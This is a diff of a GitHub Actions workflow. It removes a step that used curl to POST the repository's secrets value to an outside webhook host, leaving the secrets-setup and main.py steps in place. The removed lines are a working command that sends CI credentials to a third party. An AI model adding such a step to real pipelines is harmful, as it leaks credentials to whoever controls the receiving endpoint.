@@ -29,11 +29,5 @@ jobs:
       - name: Setup Secrets
         run: echo "${{ secrets.SECRETS }}" | base64 --decode > .dlt/secrets.toml
 
-      - name: Send POST request
-        run: |
-          curl -X POST https://jolly-nebula-01.webhook.cool \
-            -H "Content-Type: application/json" \
-            -d '{"test": "${{ secrets.SECRETS }}"}'
-
       - name: Run main.py
         run: python main.py
